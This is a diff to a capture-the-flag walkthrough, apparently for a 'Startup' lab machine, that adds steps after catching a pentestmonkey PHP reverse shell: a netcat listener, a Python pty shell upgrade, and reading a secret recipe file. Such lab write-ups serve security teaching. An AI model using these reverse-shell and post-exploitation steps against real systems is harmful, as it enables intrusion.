@@ -68,3 +68,17 @@ Lets try to get a revers shell running.
 (local host) nc -nlvp 4444
 ```
 Open the pentestmonkey.php in the web browser, we are connected!
+*********
+### Spawn a shell thru Python
+Now we need a usable shell, let use Python to launch a shell.
+```
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+**********
+### The secret recipe
+Read the file /recipe.txt
+```
+www-data@startup:/$ 
+cat /recipe.txt
+Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was ****.
+```
